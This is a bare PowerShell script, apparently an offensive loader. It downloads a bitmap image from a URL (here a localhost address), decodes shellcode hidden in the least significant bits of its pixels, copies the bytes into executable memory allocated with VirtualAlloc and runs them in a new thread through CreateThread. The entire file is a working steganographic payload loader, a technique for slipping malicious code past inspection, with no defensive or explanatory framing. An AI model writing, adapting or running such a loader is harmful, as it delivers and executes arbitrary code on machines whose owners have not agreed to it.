[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Runtime.InteropServices")


$file_uri = "http://127.0.0.1:8000/shellcode_x64.bmp" 

[Int32] $length = 2208

$MethodDefinition =
@'
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, UInt32 lpThreadId);
[DllImport("kernel32")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
'@

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru

function get_lsb([byte]$target, [byte]$source) { 
    $a = $target -shl 1
    $b = $source -band 1
    $a -bor $b
}

function get_payload($length) {
    [Int32]$pos = 0
    $BitMap = [System.Drawing.Image]::FromStream((Invoke-WebRequest -Uri $file_uri).RawContentStream, $true, $true)
    $bytes = New-Object byte[] ($length / 8)

    foreach($y in (0..($BitMap.Height-1))) {
        foreach($x in (0..($BitMap.Width-1))) {
            $Pixel = $BitMap.GetPixel($x,$y)
            $R = $Pixel | Select-Object -ExpandProperty R
            $G = $Pixel | Select-Object -ExpandProperty G
            $B = $Pixel | Select-Object -ExpandProperty B
           

            foreach ($byte in ($R, $G, $B)) {  
                if ($length -le 0) {
                    return $bytes
                }

                $idx = [int][Math]::Floor($pos / 8)
                $bytes[$idx] = get_lsb $bytes[$idx] $byte
                
                $pos += 1
                $length -= 1
            }
        }
    }
}


$payload_data = get_payload $length

[IntPtr]$ptr = $Kernel32::VirtualAlloc(0, [int][Math]::Floor($length / 8), 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($payload_data, 0, $ptr, [int][Math]::Floor($length / 8))
$Kernel32::CreateThread(0, 0, $ptr, 0, 0, 0)

Start-Sleep -s 3
